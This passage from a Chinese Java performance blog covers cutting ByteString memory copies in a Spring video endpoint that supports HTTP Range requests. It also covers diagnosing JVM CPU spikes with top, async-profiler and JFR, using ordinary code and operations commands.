<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/video"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ResponseEntity&lt;ByteStringResource&gt; <span class="title">loadVideo</span><span class="params">(HttpServletRequest request, @RequestParam(value = <span class="string">"fileKey"</span>)</span> String fileKey)</span>&#123;</span><br><span class="line">  ByteString byteString = doLoadFileV2(fileKey);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">                    .contentType(VIDEO_TYPE)</span><br><span class="line">                    .cacheControl(maxAge(DEFAULT_CACHE_AGE, DAYS).cachePublic())</span><br><span class="line">                    .eTag(eTag)</span><br><span class="line">                    .body(<span class="keyword">new</span> ByteStringResource(byteString));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>并不是所有<code>Resource</code>类型spring都支持了<code>Http Range</code>，可以看spring源码特别单独排除了<code>InputStreamResource</code>类型。<br>相关的拦截部分源码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Return whether the returned value or the declared return type extends &#123;<span class="doctag">@link</span> Resource&#125;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isResourceType</span><span class="params">(@Nullable Object value, MethodParameter returnType)</span> </span>&#123;</span><br><span class="line">		Class&lt;?&gt; clazz = getReturnValueType(value, returnType);</span><br><span class="line">		<span class="keyword">return</span> clazz != InputStreamResource<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">Resource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Turn a &#123;<span class="doctag">@code</span> Resource&#125; into a &#123;<span class="doctag">@link</span> ResourceRegion&#125; using the range</span></span><br><span class="line"><span class="comment">	 * information contained in the current &#123;<span class="doctag">@code</span> HttpRange&#125;.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> resource the &#123;<span class="doctag">@code</span> Resource&#125; to select the region from</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the selected region of the given &#123;<span class="doctag">@code</span> Resource&#125;</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 4.3</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> ResourceRegion <span class="title">toResourceRegion</span><span class="params">(Resource resource)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Don't try to determine contentLength on InputStreamResource - cannot be read afterwards...</span></span><br><span class="line">		<span class="comment">// Note: custom InputStreamResource subclasses could provide a pre-calculated content length!</span></span><br><span class="line">		Assert.isTrue(resource.getClass() != InputStreamResource<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line">				"Cannot convert an InputStreamResource to a ResourceRegion");</span><br><span class="line">		<span class="keyword">long</span> contentLength = getLengthFor(resource);</span><br><span class="line">		<span class="keyword">long</span> start = getRangeStart(contentLength);</span><br><span class="line">		<span class="keyword">long</span> end = getRangeEnd(contentLength);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ResourceRegion(resource, start, end - start + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>原因是Range协议中需要获取contentLength，<br>而InputStreamResource的数据大小获取的默认实现是将inputStream先遍历一遍，这样显然是不符合实际使用场景的。(只能读1次数据)<br>所以如果我们拿到的是inputStream+数据大小时，我们需要将contentLength自行实现一个版本（不遍历的）。<br>这里可以参考ByteStringResource:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> fengmengqi &lt;fengmengqi@xxx.com&gt;</span></span><br><span class="line"><span class="comment"> * Created on 2023-02-02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ByteStringResource</span> <span class="keyword">extends</span> <span class="title">AbstractResource</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ByteString byteString;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String description;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new &#123;<span class="doctag">@code</span> ByteStringResource&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> byteString the byteString to wrap</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ByteStringResource</span><span class="params">(ByteString byteString)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(byteString, <span class="string">"resource loaded from byteString"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new &#123;<span class="doctag">@code</span> ByteStringResource&#125; with a description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> byteString the byteString to wrap</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> description where the byteString comes from</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ByteStringResource</span><span class="params">(ByteString byteString, @Nullable String description)</span> </span>&#123;</span><br><span class="line">        Assert.notNull(byteString, <span class="string">"ByteString must not be null"</span>);</span><br><span class="line">        <span class="keyword">this</span>.byteString = byteString;</span><br><span class="line">        <span class="keyword">this</span>.description = (description != <span class="keyword">null</span> ? description : <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the underlying byteString.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> ByteString <span class="title">getByteString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.byteString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This implementation always returns &#123;<span class="doctag">@code</span> true&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exists</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This implementation returns the length of the underlying byte array.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">contentLength</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.byteString.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This implementation returns a ByteArrayInputStream for the</span></span><br><span class="line"><span class="comment">     * underlying byte array.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> java.io.ByteArrayInputStream</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> byteString.newInput();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This implementation returns a description that includes the passed-in</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> description&#125;, if any.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"ByteString resource ["</span> + <span class="keyword">this</span>.description + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This implementation compares the underlying byte array.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> java.util.Arrays#equals(byte[], byte[])</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object other)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span> == other || (other <span class="keyword">instanceof</span> ByteStringResource</span><br><span class="line">                &amp;&amp; ((ByteStringResource) other).byteString.equals(<span class="keyword">this</span>.byteString)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This implementation returns the hash code based on the</span></span><br><span class="line"><span class="comment">     * underlying byte array.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>.<span class="title">hashCode</span>() * 29 * <span class="title">this</span>.<span class="title">byteString</span>.<span class="title">size</span>())</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>理论上这个场景下（假如不修改业务逻辑），最小内存申请次数应该是2次而不是3次。（解密前、解密后）<br>目前多出来的这一次，是背景一节中，grpc代码对于一次数据的响应会进行两次堆内内存的申请，相关源码参考：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.google.protobuf.CodedInputStream.StreamDecoder#readBytesSlowPath</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Like readBytes, but caller must have already checked the fast path: (size &lt;= (bufferSize -</span></span><br><span class="line"><span class="comment">     * pos) &amp;&amp; size &gt; 0 || size == 0)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ByteString <span class="title">readBytesSlowPath</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> size)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] result = readRawBytesSlowPathOneChunk(size);</span><br><span class="line">      <span class="keyword">if</span> (result != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We must copy as the byte array was handed off to the InputStream and a malicious</span></span><br><span class="line">        <span class="comment">// implementation could retain a reference.</span></span><br><span class="line">        <span class="keyword">return</span> ByteString.copyFrom(result);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> originalBufferPos = pos;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> bufferedBytes = bufferSize - pos;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Mark the current buffer consumed.</span></span><br><span class="line">      totalBytesRetired += bufferSize;</span><br><span class="line">      pos = <span class="number">0</span>;</span><br><span class="line">      bufferSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Determine the number of bytes we need to read from the input stream.</span></span><br><span class="line">      <span class="keyword">int</span> sizeLeft = size - bufferedBytes;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The size is very large. For security reasons we read them in small</span></span><br><span class="line">      <span class="comment">// chunks.</span></span><br><span class="line">      List&lt;<span class="keyword">byte</span>[]&gt; chunks = readRawBytesSlowPathRemainingChunks(sizeLeft);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// OK, got everything.  Now concatenate it all into one buffer.</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[size];</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Start by copying the leftover bytes from this.buffer.</span></span><br><span class="line">      System.arraycopy(buffer, originalBufferPos, bytes, <span class="number">0</span>, bufferedBytes);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// And now all the chunks.</span></span><br><span class="line">      <span class="keyword">int</span> tempPos = bufferedBytes;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">final</span> <span class="keyword">byte</span>[] chunk : chunks) &#123;</span><br><span class="line">        System.arraycopy(chunk, <span class="number">0</span>, bytes, tempPos, chunk.length);</span><br><span class="line">        tempPos += chunk.length;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> ByteString.wrap(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>主要是<code>readRawBytesSlowPathOneChunk</code>和<code>copyFrom</code>这两次。<br>2020年有人发现了类似情况，相关issue参考：<br><a href="https://github.com/protocolbuffers/protobuf/issues/7899" target="_blank" rel="noopener">https://github.com/protocolbuffers/protobuf/issues/7899</a><br>目前还比较遗憾出于安全角度（回复是要保持<code>immutable</code>）被拒绝无法优化。</p>
<p>实际上用户观看一个视频的过程中chrome首先会发一个bytes=0-的请求（最早可能还有一个http到https的307），<br>然后如果服务端支持range，chrome会分段range请求，所以服务端会收到同一个文件的多个http请求。<br>本篇优化了一半内存分配，最坏gc时间压平到2s；<br>再加上临时磁盘缓存，同一个文件多次http请求只会分配3次内存，再调优一下gc配置（固定新生代大小），最坏gc时间压低到了130ms，平时大概是90ms。</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除60min未访问视频</span></span><br><span class="line">find /data/tmp/ -amin +60 -name '*.mp4' -type f -delete</span><br><span class="line">find /data/tmp/ -amin +60 -name '*.MOV' -type f -delete</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2023/02/03/2023-02/%E8%B0%83%E4%BC%98-ByteString%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E6%8B%B7%E8%B4%9D%E9%97%AE%E9%A2%98/" data-id="cldnys0mk00004vamflr0czpc" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ByteString/" rel="tag">ByteString</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HttpRange/" rel="tag">HttpRange</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jvm/" rel="tag">jvm</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2023-02/诊断-jvm程序cpu问题" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/02/01/2023-02/%E8%AF%8A%E6%96%AD-jvm%E7%A8%8B%E5%BA%8Fcpu%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2023-02-01T03:06:43.000Z" itemprop="datePublished">2023-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/java/">java</a>►<a class="article-category-link" href="/categories/java/%E6%80%A7%E8%83%BD/">性能</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/02/01/2023-02/%E8%AF%8A%E6%96%AD-jvm%E7%A8%8B%E5%BA%8Fcpu%E9%97%AE%E9%A2%98/">诊断-jvm程序cpu问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><img src="/images/2023-02/abstract.png" class="" width="800" height="1200" title="abstract">

<h1 id="TOP命令"><a href="#TOP命令" class="headerlink" title="TOP命令"></a>TOP命令</h1><p>进程出现cpu问题的时候，最常见的思路就是用top命令看一下是哪个线程导致的:</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 只看rpc进程的各线程cpu分布:(可以修改RpcServerModularStarter部分来锁定自己的进程)</span></span><br><span class="line">nohup top -b -d 2 -n 2592000 -H -p $(pgrep -d',' -f RpcServerModularStarter) | grep 'top ' -A 30  &gt;&gt; top.log 2&gt;&amp;1 &amp;</span><br><span class="line">echo $! &gt; nohup2.pid</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 看机器上所有进程的cpu分布:</span></span><br><span class="line">nohup top -bc -d 2 -n 2592000 &gt;&gt; top.log 2&gt;&amp;1 &amp;</span><br><span class="line">echo $! &gt; nohup.pid</span><br><span class="line"></span><br><span class="line">tail -fn 100 top.log</span><br></pre></td></tr></table></figure>
<p>比如以上命令可以每隔2秒打印最高cpu占用的进程、线程到日志中。<br>占用内存、磁盘空间不大，可以长期开启，但是需要手动，比较麻烦。</p>
<h1 id="容器云监控、诊断"><a href="#容器云监控、诊断" class="headerlink" title="容器云监控、诊断"></a>容器云监控、诊断</h1><p>公司有监控系统，自动开启了许多监控，我们可以看中间件的情况、cpu/线程池的历史情况：<br>信息安全因素这里略。<br>本质就是定时调用各个线程池的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.util.concurrent.ThreadPoolExecutor.getTaskCount()</span><br><span class="line">java.util.concurrent.ThreadPoolExecutor.getActiveCount()</span><br></pre></td></tr></table></figure>

<h1 id="async-profiler"><a href="#async-profiler" class="headerlink" title="async-profiler"></a>async-profiler</h1><p>配合jfr命令或者JDK Mission Control，可以定位常见的cpu,lock,alloc相关事件的问题。<br>参考之前写的: <a href="https://xiaoyue26.github.io/2022/03/25/2022-03/G1%E8%B0%83%E4%BC%98-%E5%A4%8D%E6%9D%82%E4%B8%9A%E5%8A%A1%E6%B2%BB%E7%90%86%E5%B0%8F%E8%AE%B0/">https://xiaoyue26.github.io/2022/03/25/2022-03/G1%E8%B0%83%E4%BC%98-%E5%A4%8D%E6%9D%82%E4%B8%9A%E5%8A%A1%E6%B2%BB%E7%90%86%E5%B0%8F%E8%AE%B0/</a></p>
<p>（-e参数可以指定cpu,lock,alloc，分别针对不同的jfr事件，可以生成.jfr文件）</p>
<p>参考：<a href="https://github.com/jvm-profiling-tools/async-profiler" target="_blank" rel="noopener">https://github.com/jvm-profiling-tools/async-profiler</a></p>
<p><code>jmc(JDK Mission Control)</code>: <a href="https://adoptium.net/jmc/" target="_blank" rel="noopener">https://adoptium.net/jmc/</a></p>
<h1 id="JFR监控"><a href="#JFR监控" class="headerlink" title="JFR监控"></a>JFR监控</h1><p>JFR: Java Flight Record （Java飞行记录)<br>JVM内置的黑匣子。jdk11中支持136个事件，<br>前面的async-profiler中生成的jfr只会记录其中少量一些cpu\lock\alloc相关的事件，所以优点生成的jfr文件会比较小。<br>缺点就是有些信息不够详细，也不够定制化。<br>JFR作为jvm内置的黑匣子，支持的事件非常细而全，目标是定位jvm所有问题:</p>
<img src="/images/2023-02/jfr-events.png" class="" width="800" height="1200" title="events">
<p>（来自：<a href="https://bestsolution-at.github.io/jfr-doc/" target="_blank" rel="noopener">https://bestsolution-at.github.io/jfr-doc/</a><br>，这个网站里还有各个event的简要信息）</p>
<img src="/images/2023-02/event-type.png" class="" width="800" height="1200" title="event-type">
<img src="/images/2023-02/jfr-buffer.png" class="" width="800" height="1200" title="jfr-buffer">

<p>使用流程:<br>1。定制jfc文件(配置需要打印的events);<br>2。用jfc采集jfc。</p>
<h2 id="1-定制化event事件-生成jfc"><a href="#1-定制化event事件-生成jfc" class="headerlink" title="1.定制化event事件(生成jfc)"></a>1.定制化event事件(生成jfc)</h2><img src="/images/2023-02/jfc-init.png" class="" width="800" height="1200" title="jfc-init">
<img src="/images/2023-02/jfc-edit.png" class="" width="800" height="1200" title="jfc-edit">

<p>默认JAVA_HOME里的jfc开销和大小都太大（&gt;100M/min），可以定制化开销较小的（仅选取关心的事件）。<br><a href="https://xiaoyue26.github.io/attach/2023-02/jdk8-small.jfc">jdk8-small.jfc</a><br><a href="https://xiaoyue26.github.io/attach/2023-02/jdk11-small.jfc">jdk11-small.jfc</a><br><a href="https://xiaoyue26.github.io/attach/2023-02/default-jdk8.jfc">default-jdk8.jfc</a><br><a href="https://xiaoyue26.github.io/attach/2023-02/default-jdk11.jfc">default-jdk11.jfc</a></p>
<h2 id="2-采集事件-生成jfr"><a href="#2-采集事件-生成jfr" class="headerlink" title="2.采集事件(生成jfr)"></a>2.采集事件(生成jfr)</h2><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 开始监控:</span></span><br><span class="line">jcmd &lt;pid&gt; JFR.start name=jfr_profile filename=/data/logs/8090/res.jfr maxage=1h maxsize=1g disk=true \</span><br><span class="line">settings=/data/logs/8090/config.jfc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 结束监控:</span></span><br><span class="line">jcmd &lt;pid&gt; JFR.stop name=jfr_profile</span><br></pre></td></tr></table></figure>
<p>生成res.jfr文件以后，可以用<code>JDK Mission Control</code>打开进行图形化的分析：</p>
<h3 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h3><p>可以按thread,class,方法聚合统计</p>
<img src="/images/2023-02/jfr-alloc.png" class="" width="800" height="1200" title="jfr-alloc">
<img src="/images/2023-02/jfr-alloc2.png" class="" width="800" height="1200" title="jfr-alloc2">
<h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><p>可以按class,address聚合统计;</p>
<img src="/images/2023-02/jfr-lock.png" class="" width="800" height="1200" title="jfr-lock">
<p>如果cpu问题不是某几个线程cpu占用特别高导致的，一般就是”惊群效应”导致的。<br>也就是一大堆线程同时被唤醒（每个线程只占一点点cpu，但是累积起来就很多）。<br>而这种情况往往就是这些线程同时在等待某个锁，所以cpu问题看锁的统计是很有用的。</p>
<h3 id="code-dump"><a href="#code-dump" class="headerlink" title="code dump"></a>code dump</h3><p>可以查看挂掉时候的调用栈信息:</p>
<img src="/images/2023-02/jfr-dump.png" class="" width="800" height="1200" title="jfr-dump">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>cpu问题可以分为两类：<br>1。某几个线程占大头：用top监控，可以配合jstack找出即可；<br>可以参考<a href="http://xiaoyue26.github.io/2022/11/21/2022-11/cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98%E9%80%9A%E7%94%A8%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/">http://xiaoyue26.github.io/2022/11/21/2022-11/cpu%E6%AF%9B%E5%88%BA%E9%97%AE%E9%A2%98%E9%80%9A%E7%94%A8%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/</a></p>
<p>2。没有特别高占用的线程，每个都占很少（比如3%）累积起来很多造成突刺:<br>惊群效应；可以找会阻塞住很多线程的方向：classLoader/jit/锁监控。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.zhihu.com/column/c_1264859821121355776" target="_blank" rel="noopener">https://www.zhihu.com/column/c_1264859821121355776</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://xiaoyue26.github.io/2023/02/01/2023-02/%E8%AF%8A%E6%96%AD-jvm%E7%A8%8B%E5%BA%8Fcpu%E9%97%AE%E9%A2%98/" data-id="cldl3r6a30000m5ambbhv1f2s" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jfr/" rel="tag">jfr</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jvm/" rel="tag">jvm</a></li></ul>

    </footer>
  </div>
  
</article>
 


  
    <article id="post-2022-11/cpu毛刺问题通用优化思路" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
